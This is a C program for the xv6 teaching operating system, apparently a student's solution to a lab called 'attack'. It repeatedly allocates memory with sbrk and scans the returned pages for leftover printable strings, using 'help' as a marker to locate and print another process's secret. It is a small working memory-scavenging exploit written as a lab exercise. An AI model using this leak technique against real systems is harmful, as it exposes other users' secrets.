#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define MAXSIZE  100
#define DATASIZE (8*4096*64)
#define ISPRINT(x) ((48 <= (x) && (x) <= 57) \
                || (65 <= (x) && (x) <= 90)  \
                || (97 <= (x) && (x) <= 122))

void pt(int i, char *s) {
  printf("==========================\n");
  if (!strcmp(s, "test")) 
    printf("===========%d==========\n", i);
  else 
    printf("===========%s==========\n", s);
  printf("==========================\n");
}

int
main(int argc, char *argv[]) {
  if(argc != 1){
    printf("Usage: attack the-secret\n");
    exit(1);
  }

  // 连续字符
  int count = 0;
  int flag = 0;
  char s[MAXSIZE];
  memset(s, 0, sizeof(s));
  // 多次分配
  for (int j=0; j<10; j++){
    char *p = sbrk(DATASIZE);
    for (int i=0; i<(DATASIZE/8); i++) {
      if(ISPRINT(p[i])) {
        s[count++] = p[i];
      } else {
        // 捋一遍
        // 首先找到help
        if (!strcmp(s, "help")) flag++;
        if (flag == 2 && strcmp(s, "help") && count > 0) goto ans;
        count = 0;
        memset(s, 0, sizeof(s));
      }
    }
  }
/*
secret aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
secret aaa456789
 */
ans:
  fprintf(1, "%s\n", s);
  exit(0);
}

